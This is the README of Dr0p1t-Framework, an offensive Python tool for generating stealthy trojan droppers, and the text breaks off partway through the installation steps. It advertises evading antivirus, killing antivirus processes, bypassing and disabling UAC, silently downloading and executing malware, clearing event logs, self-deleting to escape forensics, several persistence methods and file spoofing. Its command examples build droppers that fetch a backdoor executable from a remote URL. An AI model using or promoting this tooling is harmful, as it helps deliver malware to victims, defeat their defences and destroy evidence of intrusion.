# Not maintained currently (Wait for the next version)
-----
# Dr0p1t-Framework [![n0where best cybersecurity tools](https://img.shields.io/badge/25-n0where%20best%20cybersecurity%20tools-red.svg)](https://n0where.net/best-cybersecurity-tools) [![Python 3.5](https://img.shields.io/badge/Python-3.5-yellow.svg)](http://www.python.org/download/) [![Python 2.7](https://img.shields.io/badge/Python-2.7-yellow.svg)](http://www.python.org/download/) ![Build Status](https://img.shields.io/badge/Version-1.3.2.1-red.svg)

Have you ever heard about trojan droppers ?
In short dropper is type of malware that downloads other malwares and Dr0p1t gives you the chance to create a stealthy dropper that bypass most AVs and have a lot of tricks ( Trust me :D ) ;)

# Features
**+ Generated executable properties:**
- The executable size is smaller compared to other droppers generated the same way.
- Download executable on target system and execute it silently..
- Self destruct function so that the dropper will kill and delete itself after finishing it work
- Escape disk forensics by making all the files dropper create and dropper also cleans its content before deletion
- Clear event log after finishing.

**+ Framework properties:**
- Works with Windows, Linux and now have OSX support ( Thanks to @sm4sh3r )
- Dr0p1t-Server feature (beta) so now you can work from browser [See how to work with Dr0p1t-Server](#work-with-dr0p1t-server)
- Dr0p1t-Server have a scam option (beta) [See how to work with Dr0p1t-Server](#work-with-dr0p1t-server)

**+ Modules:**
- Find and kill antivirus before running the malware.
- The ability to disable UAC.
- The ability to run your malware as admin.
- Full spoof by spoofing the file icon and extension to any thing you want.
- ZIP files support so now you can compress your executable to zip file before uploading.
- Running a custom ( batch|powershell|vbs ) file you have chosen before running the executable
- In running powershell scripts it can bypass execution policy
- Using UPX to compress the dropper after creating it

**+Persistence modules:**
- Adding executable after downloading it to startup.
- Adding executable after downloading it to task scheduler ( UAC not matters ).
- Adding your file to powershell user profile so your file will be downloaded and ran every time powershell.exe run if it doesn't exist.

# Screenshots
## On Windows
<img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Windows/WinTest-1.JPG" width="100%"></img>

[See more](https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Windows)

## On Linux (Kali linux)
<img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Linux/LinuxTest-1.png" width="100%"></img>

[See more](https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Linux)

## On OSX
Still not fully tested! Need some contributors and testers :smile:

### Help menu
```
Usage: Dr0p1t.py Malware_Url [Options]

options:
-h, --help      show this help message and exit
-s              Add your malware to startup (Persistence)
-t              Add your malware to task scheduler (Persistence)
-a              Add your link to powershell user profile (Persistence)
-k              Kill antivirus process before running your malware.
-b              Run this batch script before running your malware. Check scripts folder
-p              Run this powershell script before running your malware. Check scripts folder
-v              Run this vbs script before running your malware. Check scripts folder
--runas         Bypass UAC and run your malware as admin
--spoof         Spoof the final file to an extension you choose.
--zip           Tell Dr0p1t that the malware in the link is compressed as zip
--upx           Use UPX to compress the final file.
--nouac         Try to disable UAC on victim device
-i              Use icon to the final file. Check icons folder.
--noclearevent  Tell the framework to not clear the event logs on target machine after finish.
--nocompile     Tell the framework to not compile the final file.
--only32        Download your malware for 32 bit devices only
--only64        Download your malware for 64 bit devices only
-q              Stay quite ( no banner )
-u              Check for updates
-nd             Display less output information
```
### Examples
```
./Dr0p1t.py Malware_Url [Options]
./Dr0p1t.py https://test.com/backdoor.exe -s -t -a -k --runas --upx
./Dr0p1t.py https://test.com/backdoor.exe -k -b block_online_scan.bat --only32
./Dr0p1t.py https://test.com/backdoor.exe -s -t -k -p Enable_PSRemoting.ps1 --runas
./Dr0p1t.py https://test.com/backdoor.zip -t -k --nouac -i flash.ico --spoof pdf --zip
```
# Prerequisites
- Python 2 or Python 3.

>The recommended version for Python 2 is 2.7.x , the recommended version for Python 3 is 3.5.x and don't use 3.6 because it's not supported yet by PyInstaller

### Needed dependencies for Linux
- apt
- Others will be installed from install.sh file

>Note : You must have root access

### Needed dependencies for windows
- pip
- Modules in windows_requirements.txt

# Installation
>There's a list here for all official videos for installing and using Dr0p1t [Playlist](https://www.youtube.com/playlist?list=PLn3wMo250kMb1w7W7sUcQi6smA77V2men)
- On Linux
```
git clone https://github.com/D4Vinci/Dr0p1t-Framework.git
chmod 777 -R Dr0p1t-Framework
c
